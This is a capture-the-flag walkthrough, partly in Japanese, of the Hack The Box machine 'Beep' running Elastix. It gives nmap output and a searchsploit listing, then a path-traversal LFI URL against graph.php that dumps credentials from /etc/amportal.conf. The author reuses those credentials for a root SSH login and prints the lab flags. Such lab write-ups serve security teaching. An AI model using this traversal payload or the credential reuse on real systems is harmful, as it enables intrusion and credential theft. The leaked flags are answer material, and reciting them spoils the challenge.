# How to solove ?

## add Lame to /etc/hosts
sudo vim /etc/hosts

## scan on nmap 
`nmap -sC -sV -sT -Pn  10.10.10.7`  


<details><summary>nmap 実行結果</summary> 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 22:11 JST
Nmap scan report for 10.10.10.7
Host is up (0.88s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES UIDL AUTH-RESP-CODE PIPELINING APOP STLS IMPLEMENTATION(Cyrus POP3 server v2) USER TOP EXPIRE(NEVER) LOGIN-DELAY(0)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: X-NETSCAPE MAILBOX-REFERRALS CHILDREN MULTIAPPEND Completed NO ACL BINARY LIST-SUBSCRIBED OK THREAD=REFERENCES URLAUTHA0001 NAMESPACE CONDSTORE LISTEXT THREAD=ORDEREDSUBJECT RIGHTS=kxte IDLE UIDPLUS CATENATE UNSELECT ATOMIC ID RENAME QUOTA LITERAL+ SORT SORT=MODSEQ ANNOTATEMORE IMAP4 IMAP4rev1 STARTTLS
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-02-09T14:25:34+00:00; +1h08m49s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h08m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 526.63 seconds
</details>

###  Summary
PORT     STATE  SERVICE       VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https?
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)

## search exploit 
`searchsploit elastix`
```
 Exploit Title|  Path
------------------------------------------------------------------------
Elastix - 'page' Cross-Site Scripting   | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities   | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection   | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution  | php/webapps/18650.py
------------------------------------------------------------------------
Shellcodes: No Results

```
use Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

```

30 : AMPDBHOST=localhost  
31 : AMPDBENGINE=mysql  
32 : # AMPDBNAME=asterisk  
33 : AMPDBUSER=asteriskuser  
34 : # AMPDBPASS=amp109  
35 : AMPDBPASS=jEhdIekWmdjE  
36 : AMPENGINE=asterisk  
37 : AMPMGRUSER=admin  
38 : #AMPMGRPASS=amp111  
39 : AMPMGRPASS=jEhdIekWmdjE  
```

user : admin
pass : jEhdIekWmdjE

## try ssh 
└─$ ssh admin@10.10.10.
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

vim ~/.ssh/config
Host 10.10.*.*
KexAlgorithms +diffie-hellman-group1-sha1

└─$ ssh admin@10.10.10.
admin@10.10.10.7's password: 
Permission denied, please try again.


ssh root@10.10.10.7
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt 
61e5aad5bb4ca22213ab24809e5dfbf4


[root@beep ~]# cat /home/fanis/user.txt 
fa17c76d469476dfc89e2dfc897345d9
